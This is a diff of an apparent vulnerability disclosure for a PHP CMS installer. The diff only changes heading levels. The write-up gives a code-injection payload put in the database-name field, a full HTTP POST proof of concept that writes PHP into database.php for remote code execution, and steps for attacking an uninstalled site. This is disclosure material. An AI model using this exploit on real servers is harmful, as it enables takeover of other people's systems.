@@ -8,7 +8,7 @@ The RCE is connected through the CMS installation interface
 ## Payload:
 ``` exp;-- ---'];phpinfo();['```
 
-##Vulnerability Reproduction:
+###Vulnerability Reproduction:
 Normal installation of .database.php
 During installation, the process immediately jumps to step 3.
 File After Successful Exploitation:
@@ -18,15 +18,15 @@ In tracing the code, it is found that the issue occurs when writing to . The var
 
 However, bypassing the database creation query is required.
 
-##Code Flow:
+###Code Flow:
 The code checks for the support of the MySQLi component and attempts to connect to MySQL.
 The second checks if the entered database name exists. If not, it executes an unfiltered SQL statement. At this point, entering a new database name can bypass the detection, allowing an SQL query to be executed.elseifCREATE TABLE
 Thus, the exploit is:
 ```exp;-- ---'];phpinfo();['```
-##Dynamic Analysis:
+###Dynamic Analysis:
 If the SQL query is successfully executed, the rest of the process proceeds smoothly.
 The function is used to write to , achieving Remote Code Execution (RCE).file_put_contentsdatabase.php
-##Proof of Concept (PoC):
+###Proof of Concept (PoC):
 ```
 POST /index.php?c=install&m=index&is_install_db=0&step=2 HTTP/1.1
 Host: 192.168.1.7:8888
@@ -45,6 +45,6 @@ Connection: close
 is_form=1&is_admin=0&is_tips=&csrf_test_name=9e9016fb5bc3f485a8e925a7c5c91234&data%5Bname%5D=%E6%88%91%E7%9A%84%E9%A1%B9%E7%9B%AE&data%5Bemail%5D=admin%40admin.com&data%5Busername%5D=admin&data%5Bpassword%5D=admin&data%5Bdb_host%5D=127.0.0.1&data%5Bdb_user%5D=root&data%5Bdb_pass%5D=123456&data%5Bdb_name%5D=ee5%3B--+---'%5D%3Bphpinfo()%3B%5B'&data%5Bdb_prefix%5D=dr_&is_install_db=1
 ```
 
-##Reproduce the Issue:
+###Reproduce the Issue:
 1.Remotely connect to the attacker's database.
 2.The other party did not install the CMS, and did not generate the lock file.
